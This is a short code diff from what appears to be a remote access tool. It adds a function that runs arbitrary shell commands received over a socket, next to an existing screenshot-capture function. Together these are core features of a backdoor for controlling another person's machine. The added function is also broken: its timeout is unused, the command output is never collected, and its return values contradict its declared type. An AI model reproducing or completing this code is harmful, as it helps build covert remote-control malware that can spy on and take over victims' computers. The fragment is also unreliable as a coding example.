@@ -293,3 +293,29 @@ def take_screenshot(socket) -> bool:
     except Exception as e:
         socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
         return False
+
+
+def execute_system_command(
+    socket, command: str, timeout: int = 30
+) -> bool:
+    try:
+        # Basic command validation
+        if not command or not isinstance(command, str):
+            socket_send(socket, "[!] Error: Invalid command")
+            return False
+
+        # Execute command with timeout
+        result = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+        )
+
+    except FileNotFoundError:
+        return (False, b"[!] Error: Command not found")
+    except subprocess.SubprocessError as e:
+        return (False, f"[!] Subprocess error: {str(e)}".encode())
+    except Exception as e:
+        return (False, f"[!] Unexpected error: {str(e)}".encode())
